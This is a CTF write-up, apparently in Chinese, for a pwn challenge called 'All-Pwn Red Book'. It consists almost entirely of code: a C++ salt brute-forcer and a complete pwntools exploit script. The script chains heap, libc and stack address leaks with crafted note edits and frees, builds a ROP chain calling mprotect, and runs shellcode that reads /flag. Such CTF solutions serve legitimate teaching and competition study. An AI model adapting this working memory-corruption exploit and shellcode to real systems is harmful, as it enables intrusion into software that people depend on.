0x00:0x08: padding | 0x8:0x10: size0x10:0x18：type_B_vtable | 0x18:0x20:password ptr0x20:0x50: content_text
```



```
申请chunk存放base64编码数据 ==> 申请chunk存放解码后的明文数据 ==> 将数据进行加密，加密结果也是申请chunk存放并复制到note_context里
```



```
for i in range(2): add(3)edit(0,base64.b64encode(b"A"*0x800),mode=1,password="Summer2024!Vacation@Time#Beach$Day") # 1edit(1,base64.b64encode(b"A"*0x900),mode=1,password="Summer2024!Vacation@Time#Beach$Day") # 2
```



```
#include<iostream>#include<string>#include<vector>#include<thread>#include<atomic>#include<mutex>#include<chrono>#include<iomanip>#include<cstring>#include<algorithm>#include<windows.h>#ifndefNOMINMAX#defineNOMINMAX#endif// 优化的SHA256实现classSafeSHA256{private: uint32_th[8]; uint8_tbuffer[64]; uint64_ttotalLength; size_tbufferLength; staticconstexpruint32_tK[64] = { 0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5, 0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174, 0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da, 0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967, 0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85, 0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070, 0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3, 0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2 }; staticuint32_trotr(uint32_tx,uint32_tn){ return(x >> n) | (x << (32- n)); } staticuint32_tchoose(uint32_te,uint32_tf,uint32_tg){ return(e & f) ^ (~e & g); } staticuint32_tmajority(uint32_ta,uint32_tb,uint32_tc){ return(a & b) ^ (a & c) ^ (b & c); } voidprocessChunk(constuint8_t* chunk){ uint32_tw[64]; for(size_ti =0; i <16; i++) { w[i] = (chunk[i *4] <<24) | (chunk[i *4+1] <<16) | (chunk[i *4+2] <<8) | (chunk[i *4+3]); } for(size_ti =16; i <64; i++) { uint32_ts0 = rotr(w[i -15],7) ^ rotr(w[i -15],18) ^ (w[i -15] >>3); uint32_ts1 = rotr(w[i -2],17) ^ rotr(w[i -2],19) ^ (w[i -2] >>10); w[i] = w[i -16] + s0 + w[i -7] + s1; } uint32_ta = h[0], b = h[1], c = h[2], d = h[3], e = h[4], f = h[5], g = h[6], h_val = h[7]; for(size_ti =0; i <64; i++) { uint32_tS1 = rotr(e,6) ^ rotr(e,11) ^ rotr(e,25); uint32_tch = choose(e, f, g); uint32_ttemp1 = h_val + S1 + ch + K[i] + w[i]; uint32_tS0 = rotr(a,2) ^ rotr(a,13) ^ rotr(a,22); uint32_tmaj = majority(a, b, c); uint32_ttemp2 = S0 + maj; h_val = g; g = f; f = e; e = d + temp1; d = c; c = b; b = a; a = temp1 + temp2; } h[0] += a; h[1] += b; h[2] += c; h[3] += d; h[4] += e; h[5] += f; h[6] += g; h[7] += h_val; }public: SafeSHA256() { reset(); } voidreset(){ h[0] =0x6a09e667; h[1] =0xbb67ae85; h[2] =0x3c6ef372; h[3] =0xa54ff53a; h[4] =0x510e527f; h[5] =0x9b05688c; h[6] =0x1f83d9ab; h[7] =0x5be0cd19; totalLength =0; bufferLength =0; memset(buffer,0,64); } voidupdate(constuint8_t* data,size_tlength){ totalLength += length; while(length >0) { size_ttoCopy = (std::min)(length,64- bufferLength); memcpy(buffer + bufferLength, data, toCopy); bufferLength += toCopy; data += toCopy; length -= toCopy; if(bufferLength ==64) { processChunk(buffer); bufferLength =0; } } } voidfinal(uint8_t* hash){ buffer[bufferLength++] =0x80; if(bufferLength >56) { memset(buffer + bufferLength,0,64- bufferLength); processChunk(buffer); bufferLength =0; } memset(buffer + bufferLength,0,56- bufferLength); uint64_tbitLength = totalLength *8; for(inti =0; i <8; i++) { buffer[56+ i] = (bitLength >> (56- i *8)) &0xFF; } processChunk(buffer); for(inti =0; i <8; i++) { hash[i *4] = (h[i] >>24) &0xFF; hash[i *4+1] = (h[i] >>16) &0xFF; hash[i *4+2] = (h[i] >>8) &0xFF; hash[i *4+3] = h[i] &0xFF; } }};classSafeSaltBruteForcer{private: std::stringkey_; uint64_texpected_result_; uint64_tciphertext_; std::atomic<bool> found_{false}; std::atomic<bool> stop_requested_{false}; std::atomic<uint64_t> current_salt_{0}; std::mutex output_mutex_; uint32_tcorrect_salt_{0}; // 预计算的基础SHA256状态 SafeSHA256 base_sha_; std::vector<uint8_t> key_data_; // 性能统计 std::atomic<uint64_t> total_tested_{0}; std::chrono::steady_clock::time_point start_time_;public: SafeSaltBruteForcer(conststd::string& key,uint64_texpected_result,uint64_tciphertext) : key_(key), expected_result_(expected_result), ciphertext_(ciphertext) { key_data_.assign(key.begin(), key.end()); base_sha_.update(key_data_.data(), key_data_.size()); } // 安全的worker函数，包含资源控制和优雅退出 voidsafe_worker(intthread_id,intmax_threads){ SafeSHA256 sha; uint8_thash[32]; uint8_tsalt_bytes[4]; uint64_tlocal_tested =0; constexpruint32_tBATCH_SIZE =64;// 减小批量大小以减少内存压力 // 使用正常的线程优先级，避免系统冻结 SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL); // 简单的负载均衡：每个线程处理不同的salt范围 uint32_tstart_salt = (0xFFFFFFFF/ max_threads) * thread_id; uint32_tend_salt = (thread_id == max_threads -1) ?0xFFFFFFFF: ((0xFFFFFFFF/ max_threads) * (thread_id +1) -1); std::cout<<"[Thread "<< thread_id <<"] Range: 0x"<<std::hex << start_salt <<" - 0x"<< end_salt <<std::endl; for(uint32_tsalt = start_salt; salt <= end_salt && !found_ && !stop_requested_; salt++) { uint32_tmasked_salt = salt &0xFFFFFF0F; // 转换salt为字节 salt_bytes[0] = (masked_salt >>0) &0xFF; salt_bytes[1] = (masked_salt >>8) &0xFF; salt_bytes[2] = (masked_salt >>16) &0xFF; salt_bytes[3] = (masked_salt >>24) &0xFF; // 复制预计算状态并处理salt sha = base_sha_; sha.update(salt_bytes,4); sha.final(hash); // 64位异或和比较 uint64_thash_uint64; memcpy(&hash_uint64, hash,8); if((ciphertext_ ^ hash_uint64) == expected_result_) { found_ =true; correct_salt_ = masked_salt; std::lock_guard<std::mutex>lock(output_mutex_); std::cout<<"n[Thread "<< thread_id <<"] FOUND CORRECT SALT!"<<std::endl; std::cout<<"Salt: 0x"<<std::hex <<std::setw(8) <<std::setfill('0') << masked_salt <<std::endl; std::cout<<"SHA256: "; for(intj =0; j <8; j++) { std::cout<<std::hex <<std::setw(2) <<std::setfill('0') <<static_cast<int>(hash[j]); } std::cout<<std::endl; return; } local_tested++; total_tested_++; // 每10万次检查一次停止信号，减少检查频率 if(local_tested %100000==0) { // 偶尔让出CPU时间片，避免完全占用 if(local_tested %1000000==0) { std::this_thread::sleep_for(std::chrono::milliseconds(1)); } // 进度报告（仅主线程） if(thread_id ==0) { autonow =std::chrono::steady_clock::now(); autoelapsed =std::chrono::duration_cast<std::chrono::milliseconds>(now - start_time_).count(); if(elapsed >0) { doublespeed =static_cast<double>(total_tested_.load()) / elapsed *1000.0; doubleprogress =static_cast<double>(salt - start_salt) / (end_salt - start_salt) *100.0; std::cout<<"Thread "<< thread_id <<": "<<std::fixed <<std::setprecision(2) << progress <<"% | Speed: "<<static_cast<uint64_t>(speed) <<" hashes/sec" <<" | Total: "<<std::dec << total_tested_.load() <<" | Elapsed: "<< (elapsed /1000) <<"s"<<std::endl; } } } } std::cout<<"[Thread "<< thread_id <<"] Finished its range. Tested: "<< local_tested <<" salts"<<std::endl; } // 停止爆破的函数 voidstop(){ stop_requested_ =true; } uint32_tbruteForce(intnum_threads =0){ // 安全地限制线程数量 if(num_threads ==0) { SYSTEM_INFO sysInfo; GetSystemInfo(&sysInfo); num_threads = sysInfo.dwNumberOfProcessors; // 安全限制：最多使用4个线程，避免系统资源耗尽 if(num_threads >4) { num_threads =4; } } // 额外安全限制 if(num_threads >10) { std::cout<<"警告: 线程数过多，限制为8个线程"<<std::endl; num_threads =10; } std::cout<<"=== 安全的Salt爆破程序 ==="<<std::endl; std::cout<<"Key: "<< key_ <<std::endl; std::cout<<"预期结果: 0x"<<std::hex << expected_result_ <<std::endl; std::cout<<"密文: 0x"<<std::hex << ciphertext_ <<std::endl; std::cout<<"使用线程数: "<<std::dec << num_threads <<" (安全限制)"<<std::endl; std::cout<<"搜索空间: 0x"<<std::hex <<0xFFFFFFFF<<" salts"<<std::endl; std::cout<<"按 Ctrl+C 可随时停止程序"<<std::endl; std::cout<<"=========================="<<std::endl; start_time_ =std::chrono::steady_clock::now(); std::vector<std::thread> threads; // 创建线程 for(inti =0; i < num_threads; ++i) { threads.emplace_back(&SafeSaltBruteForcer::safe_worker,this, i, num_threads); } // 设置Ctrl+C处理 SetConsoleCtrlHandler([](DWORD dwCtrlType) -> BOOL { if(dwCtrlType == CTRL_C_EVENT) { std::cout<<"n收到停止信号，正在优雅退出..."<<std::endl; returnTRUE; } returnFALSE; }, TRUE); // 等待所有线程完成 for(auto& thread : threads) { thread.join(); } autoend_time =std::chrono::steady_clock::now(); autoelapsed =std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time_).count(); std::cout<<"n=== 结果 ==="<<std::endl; std::cout<<"总耗时: "<< elapsed <<" 秒"<<std::endl; std::cout<<"总测试数: "<<std::dec << total_tested_.load() <<" salts"<<std::endl; if(elapsed >0) { std::cout<<"平均速度: "<< (total_tested_.load() / elapsed) <<" hashes/sec"<<std::endl; } if(found_) { std::cout<<"成功! 正确的salt: 0x"<<std::hex << correct_salt_ <<std::endl; returncorrect_salt_; } elseif(stop_requested_) { std::cout<<"用户中止搜索"<<std::endl; return0; } else{ std::cout<<"未找到匹配的salt"<<std::endl; return0; } }};uint64_tparseHexString(conststd::string& hex_str){ if(hex_str.length() !=16) { throwstd::invalid_argument("密文必须是8字节(16个16进制字符)"); } uint64_tresult =0; for(size_ti =0; i <16; i +=2) { std::stringbyte_str = hex_str.substr(i,2); uint8_tbyte =static_cast<uint8_t>(std::stoi(byte_str,nullptr,16)); result = (result <<8) | byte; } returnresult;}intmain(){ try{ SetConsoleOutputCP(CP_UTF8); std::stringkey ="Cbc123!@#Def456$%^Ghi789&*()Jkl0"; uint64_texpected_result =0x4246555142465551; std::stringciphertext_hex; std::cout<<"Enter 8-byte ciphertext (hex, e.g., 0123456789ABCDEF): "; std::cin>> ciphertext_hex; uint64_tciphertext = parseHexString(ciphertext_hex); intnum_threads =10; SafeSaltBruteForcerbruteForcer(key, expected_result, ciphertext); uint32_tresult = bruteForcer.bruteForce(num_threads); std::cout<<"n按回车键退出..."; std::cin.ignore(); std::cin.get(); returnresult ==0?1:0; } catch(conststd::exception& e) { std::cerr<<"错误: "<< e.what() <<std::endl; std::cout<<"按回车键退出..."; std::cin.ignore(); std::cin.get(); return1; }}
```



```
show(1,"A"*0x20)#伪造passwordp.recvuntil("Note Content: ")payload = p.recv(0x30)en_payload = spec_en_aes_text(b"A"*0x20,salt,payload)libc.address = u64(en_payload[0x20:0x28]) -0x21ace0print(hex(libc.address))
```



```
frompwnimport*importbase64importhashlibfromCrypto.Util.Paddingimportpad, unpadfromCrypto.CipherimportAEScontext(arch='amd64', os='linux', log_level='debug')context.terminal = ["wt.exe","wsl.exe"]BIN_FILE ='./pwn'LIBC_FILE ='./lib/libc.so.6'defget_p(): returnprocess(BIN_FILE) # return remote("127.0.0.1",9999)defdebug(gdb_script=None): gdb.attach(p, gdb_script) sleep(2)elf = ELF(BIN_FILE)libc = ELF(LIBC_FILE)defget_local_salt(): withopen("./log/salt","rb")asf : returnf.readline()defadd(type): p.sendlineafter("Pick your main character move",'1') p.sendlineafter("Drop your vibe number",str(type))defview(): p.sendlineafter("Pick your main character move",'2')defedit(idx,content,mode=0,password=""): p.sendlineafter("Pick your main character move",'3') p.sendlineafter("Note number",str(idx)) p.sendlineafter("Please enter note content:",content) ifmode ==1: p.sendlineafter("Set as private post?",'y') p.sendlineafter("Password:",password) else: p.sendlineafter("Set as private post?",'n')defedit_en(idx,content,mode=0,password=""): p.sendlineafter("Pick your main character move",'3') p.sendlineafter("Note number",str(idx)) p.sendlineafter("Please enter note content:",content) p.sendlineafter("password:",password) ifmode ==1: p.sendlineafter("Set as private post?",'y') p.sendlineafter("assword:",password) else: p.sendlineafter("Set as private post?",'n')defedit_en2(idx,content,mode=0,password="",password_2=""): p.sendlineafter("Pick your main character move",'3') p.sendlineafter("Note number",str(idx)) p.sendlineafter("Please enter note content:",content) p.sendlineafter("password:",password) ifmode ==1: p.sendlineafter("Set as private post?",'y') p.sendlineafter("assword:",password_2) else: p.sendlineafter("Set as private post?",'n')defedit_fuck(idx,content,mode=0,password=""): p.sendlineafter("Pick your main character move",'3') p.sendlineafter("Note number",str(idx)) p.sendlineafter("Set as private post?",'y') p.sendlineafter("assword:",password) p.sendlineafter("Please enter note content:",content) defde_xor_text(key,salt,content,mode=1): m = hashlib.sha256() print(key+salt) m.update(key+salt) key_xor =m.digest() de_content =b"" ifmode ==1: foriinrange(len(content)): de_content += p8(content[i]^key_xor[8+i]) else: foriinrange(len(content)): de_content += p8(content[i]^key_xor[0x10+i]) returnde_contentdefen_aes_text(key,salt,content): m = hashlib.sha256() # print(key+salt) m.update(key+salt) key_aes =m.digest() print(key_aes) aes = AES.new(key_aes,AES.MODE_CBC,key_aes[:0x10]) payload = aes.encrypt(content) returnpayloaddefspec_en_aes_text(key,salt,content): m = hashlib.sha256() # print(key+salt) m.update(key+salt) key_aes =m.digest() print(key_aes) aes = AES.new(key_aes,AES.MODE_CBC,b"x00"*0x10) payload = aes.encrypt(content) returnpayloaddefde_aes_text(key,salt,content): m = hashlib.sha256() # print(key+salt) m.update(key+salt) key_aes =m.digest() print(key_aes) aes = AES.new(key_aes,AES.MODE_CBC,key_aes[:0x10]) payload = aes.decrypt(content) returnpayloaddefshow(idx,password): p.sendlineafter("Pick your main character move",'4') p.sendlineafter("Note number",str(idx)) p.sendlineafter("password",password)defdele(idx): p.sendlineafter("Pick your main character move",'5') p.sendlineafter("Note number",str(idx))p = get_p()foriinrange(2): add(3)edit(0,base64.b64encode(b"A"*0x800),mode=1,password="Summer2024!Vacation@Time#Beach$Day")# 1edit(1,base64.b64encode(b"A"*0x900),mode=1,password="Summer2024!Vacation@Time#Beach$Day")# 2add(2)add(2)edit(3,base64.b64encode(b"B"*8),mode=1,password="Abc123!@#Def456$%^Ghi789&*()Jkl0")# 3edit(2,base64.b64encode(b"B"*8),mode=1,password="Cbc123!@#Def456$%^Ghi789&*()Jkl0")# 4show(2,"Cbc123!@#Def456$%^Ghi789&*()Jkl0")# 1p.recvuntil("B"*8)p.recv(0x18)guess = p.recv(8)# io = process("/mnt/d/pwn_test/xctf_final/All-Pwn-Red-Book/get_salt.exe")# print(u64(guess))# io.sendlineafter("0123456789ABCDEF",hex(u64(guess))[2:])# io.recvuntil("salt: ")# salt = p32(int(io.recvline(),16))# io.close()salt = get_local_salt()print("salt ==> "+str(salt))show(3,b"Abc123!@#Def456$%^Ghi789&*()Jkl0")# 2p.recvuntil("B"*8)heap = p.recv(6)content = de_xor_text(b"Abc123!@#Def456$%^Ghi789&*()Jkl0",salt,heap)heap = u64(content.ljust(0x8,b"x00"))add(2)add(1)add(1)add(1)heap_1 =0x120+ heapheap_2 =0x8ba80+ heapheap_3 = heap -0x4800edit_en(3,base64.b64encode(p64(heap_1)),mode=0,password="Abc123!@#Def456$%^Ghi789&*()Jkl0")# 5dele(-17-5)# 1print(hex(heap))edit(2,base64.b64encode(p64(heap_2)),mode=0,password="MyP@ssw0rd_2024!Secur1ty_Key#123")# 6dele(-17-5)# 2edit(1,base64.b64encode(p64(heap_3)),mode=0,password="MyP@ssw0rd_2024!Secur1ty_Key#123")# 7dele(-17-5)# 3edit(0,base64.b64encode(b"A"*0x28),mode=1,password="MyP@ssw0rd_2024!Secur1ty_Key#123") # 8show(0,"MyP@ssw0rd_2024!Secur1ty_Key#123")# 3p.recvuntil("A"*0x28)type_A = p.recv(6)content = de_xor_text(b"MyP@ssw0rd_2024!Secur1ty_Key#123",salt,type_A)type_A = u64(content.ljust(0x8,b"x00"))type_B = type_A +0x80type_C = type_B +0x40pie = type_A -0x038FE18got =0x03A8870+ pienote_list = heap +0xc0-8edit_en(0,base64.b64encode(p64(heap+0x28)+p64(type_C)+p64(0)+p64(note_list)+p64(0x20)+p64(0x140)),mode=0,password="MyP@ssw0rd_2024!Secur1ty_Key#123")# 9payload = de_aes_text(b"HeP@ssw0rd_2024!Secur1ty_Key#123",salt,p64(heap+0x28) + p64(heap+0x10) + p64(heap+0x28)+p64(heap+0x28)+b"A"*0x20+p64(0)+b"/flag".ljust(0x8,b"x00"))edit(-17-5,base64.b64encode(payload),mode=1,password="HeP@ssw0rd_2024!Secur1ty_Key#123") # 10print(hex(note_list-0x10))target =0x8d120+ heapedit(0,base64.b64encode(p64(heap+0x28)+p64(type_C)+p64(note_list+0x30)+p64(target-0x10)+p64(0x40)+p64(0x40)),mode=0,password="TPP@ssw0rd_2024!Secur1ty_Key#123")# 11show(1,"A"*0x20)p.recvuntil("Note Content: ")payload = p.recv(0x30)en_payload = spec_en_aes_text(b"A"*0x20,salt,payload)libc.address = u64(en_payload[0x20:0x28]) -0x21ace0print(hex(libc.address))edit(0,base64.b64encode(p64(heap+0x28)+p64(type_C)+p64(note_list+0x30)+p64(libc.sym['environ']-0x10)+p64(0x40)+p64(0x40)),mode=0,password="TPP@ssw0rd_2024!Secur1ty_Key#123")# 12show(1,"A"*0x20)p.recvuntil("Note Content: ")payload = p.recv(0x30)en_payload = spec_en_aes_text(b"A"*0x20,salt,payload)stack = u64(en_payload[:0x8]) -0x1890print(hex(stack))edit(0,base64.b64encode(p64(heap+0x28)+p64(type_C)+p64(0)+p64(stack)+p64(0x160)+p64(0x160)),mode=0,password="TPP@ssw0rd_2024!Secur1ty_Key#123")# 13pop_rdi =0x2a3e5+ libc.addresspop_rsi =0x2be51+ libc.addresspop_rdx_rbx =0x904a9+ libc.addresspop_rax =0x0000000000045eb0+ libc.addresssyscall =0x00000000000ec079+ libc.addressorder2 =b'hx00'[::-1].hex()order1 =b'/bin/shx00'[::-1].hex()shellcode = asm(f""" mov rax, 0x00000067616c662f push rax mov rsi, rsp sub rsp, 0x100 lea rdx, [rsp] mov rax,128 mov [rdx], rax mov rax,0 mov [rdx+4],rax lea rcx, [rsp+128] mov rax, 303 mov rdi, 4 mov r8, 0 syscall mov rax, 304 mov rdi, 3 mov rsi, rdx mov rdx,0 syscall mov rbx, rax mov rax, 0 mov rdi, rbx mov rsi, rsp mov rdx, 100 syscall mov rdx, rax mov rax, 1 mov rdi, 1 mov rsi, rsp syscall""")jmp_rdi =0x00000000000b131c+ libc.addressstack_execute = p64(pop_rdi) + p64(stack &-4096) + p64(pop_rsi) + p64(0x2000) + p64(pop_rdx_rbx) + p64(7)*2+ p64(libc.sym['mprotect']) + p64(pop_rdi) + p64(stack -0x50-0xb8+0x170) + p64(jmp_rdi)stack_execute += shellcodeprint(hex(len(stack_execute)))stack_execute = stack_execute.ljust(0x140,b"x90")raw_input()payload = de_aes_text(b"MeP@ssw0rd_2024!Secur1ty_Key#123",salt,stack_execute)edit(1,base64.b64encode(payload),mode=1,password="MeP@ssw0rd_2024!Secur1ty_Key#123")# 13p.interactive()
```



```
mov rax, 0x00000067616c662f push rax mov rsi, rsp sub rsp, 0x100 lea rdx, [rsp] mov rax,128 mov [rdx], rax mov rax,0 mov [rdx+4],rax lea rcx, [rsp+128] mov rax, 303 mov rdi, 4 mov r8, 0 syscall mov rax, 304 mov rdi, 3 mov rsi, rdx mov rdx,0 syscall mov rbx, rax mov rax, 0 mov rdi, rbx mov rsi, rsp mov rdx, 100 syscall mov rdx, rax mov rax, 1 mov rdi, 1 mov rsi, rsp syscall
```



```
#!/bin/shcp /flag /home/pwn/flagchmod 666 /home/pwn/flagecho"🧹 深度清理进行中 / Scrub-a-dub-dub! Purging stale data..."FILE="/home/pwn/log/salt"if[ -f"$FILE"];then rm -f"$FILE"fiyes'🧹 ...'| head -n 10mkdir -p /home/pwn/logecho-n"aaaa">"$FILE"chmod 666"$FILE"echo"🔧 正在启动全pwn小红书 / Launching All-Pwn Red Book..."sleep 3echo" 33c"cd/home/pwntimeout 180s ./pwn
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1762737512-wxsync-2025-11-a8786e747d40eeb327a300e33ce704bf.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1762737514-wxsync-2025-11-4f142d8c5f05309bc2ac5fd071755cef.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1762737516-wxsync-2025-11-b57670a0b3bbf047e2b0489d3ba471c0.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1762737520-wxsync-2025-11-042a7e00ea5b61484b0db144b6cb5e23.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1762737521-wxsync-2025-11-4ed0bef938b51ac49e78fe0c353ca77b.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1762737523-wxsync-2025-11-edfb2be3f0a242e2c34ee16c335b9d94.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1762737525-wxsync-2025-11-c023a96ecbbc63a680e3a9609d0c32f2.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1762737527-wxsync-2025-11-4d6de3176b5a6b423286c680358fbef4.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1762737529-wxsync-2025-11-f32263fb9a9141453e267c1613197c6e.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1762737531-wxsync-2025-11-6c6fe4170ea984b0cae48409c5cd6406.png)